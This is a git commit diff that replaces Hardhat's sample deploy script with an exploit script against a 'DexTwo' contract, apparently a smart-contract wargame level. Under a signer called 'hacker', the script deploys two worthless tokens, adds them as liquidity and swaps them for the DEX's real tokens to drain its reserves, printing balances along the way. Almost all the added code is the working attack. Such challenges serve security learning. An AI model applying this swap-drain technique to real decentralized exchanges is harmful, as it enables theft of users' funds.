c554b6c11836d051882d3564787dac68cd1fc7e7
Carlos Benjamin Alvarez Cruz <carlosalvarez098@gmail.com>
2022-03-05 17:57:37 -0600

    final

--- scripts/sample-script.js
+++ scripts/sample-script.js
@@ -1,29 +1,60 @@
-// We require the Hardhat Runtime Environment explicitly here. This is optional
-// but useful for running the script in a standalone fashion through `node <script>`.
-//
-// When running the script with `npx hardhat run <script>` you'll find the Hardhat
-// Runtime Environment's members available in the global scope.
-const hre = require("hardhat");
+const { ethers } = require("hardhat");
+
 
 async function main() {
-  // Hardhat always runs the compile task when running scripts with its command
-  // line interface.
-  //
-  // If this script is run directly using `node` you may want to call compile
-  // manually to make sure everything is compiled
-  // await hre.run('compile');
 
-  // We get the contract to deploy
-  const Greeter = await hre.ethers.getContractFactory("Greeter");
-  const greeter = await Greeter.deploy("Hello, Hardhat!");
+  const [hacker] = await ethers.getSigners();
 
-  await greeter.deployed();
+  const WorthlessToken1 = await ethers.getContractFactory("WorthlessToken", hacker);
+  const WorthlessToken2 = await ethers.getContractFactory("WorthlessToken", hacker);
 
-  console.log("Greeter deployed to:", greeter.address);
+  const worthlessToken1 = await WorthlessToken1.deploy("WorthlessToken1", "WTKN1", 300);
+  const worthlessToken2 = await WorthlessToken2.deploy("WorthlessToken2", "WTKN2", 300);
+
+  const Dex2_Address = '0x845C8F72d95B8Ad005F9a4A39071cd3C44b51594';
+
+  const Dex2 = await ethers.getContractAt('DexTwo', Dex2_Address);
+
+  const token1_address = await Dex2.token1();
+  const token2_address = await Dex2.token2();
+  
+  let token1_dex2_balance = await Dex2.balanceOf(token1_address, Dex2_Address);
+  let token2_dex2_balance = await Dex2.balanceOf(token2_address, Dex2_Address);
+
+  let token1_hacker_balance = await worthlessToken1.balanceOf(hacker.address);
+  let token2_hacker_balance = await worthlessToken2.balanceOf(hacker.address);
+  
+  console.log('\n------------------- INITIAL STATE -------------------\n')
+  
+  console.log(`Dex2 Token1 Balance: ${token1_dex2_balance.toString()}`);
+  console.log(`Dex2 Token2 Balance: ${token2_dex2_balance.toString()}`);
+
+  console.log(`Hacker Token1 Balance: ${token1_hacker_balance.toString()}`);
+  console.log(`Hacker Token2 Balance: ${token2_hacker_balance.toString()}\n`);
+
+  await worthlessToken1.approve(Dex2_Address, 200);
+  let tx = await worthlessToken2.approve(Dex2_Address, 200);
+  await tx.wait()
+
+  await Dex2.connect(hacker).add_liquidity(worthlessToken1.address, 100);
+  tx = await Dex2.connect(hacker).add_liquidity(worthlessToken2.address, 100);
+  await tx.wait()
+
+  await Dex2.connect(hacker).swap(worthlessToken1.address, token1_address, 100);
+  
+  tx = await Dex2.connect(hacker).swap(worthlessToken2.address, token2_address, 100);
+  await tx.wait()
+
+  console.log('\n------------------- STATE BEFORE HACK -------------------\n')
+
+  token1_dex2_balance = await Dex2.balanceOf(token1_address, Dex2_Address);
+  token2_dex2_balance = await Dex2.balanceOf(token2_address, Dex2_Address);
+
+  console.log(`Dex2 Token1 Balance: ${token1_dex2_balance.toString()}`);
+  console.log(`Dex2 Token2 Balance: ${token2_dex2_balance.toString()}`);
 }
 
-// We recommend this pattern to be able to use async/await everywhere
-// and properly handle errors.
+
 main()
   .then(() => process.exit(0))
   .catch((error) => {
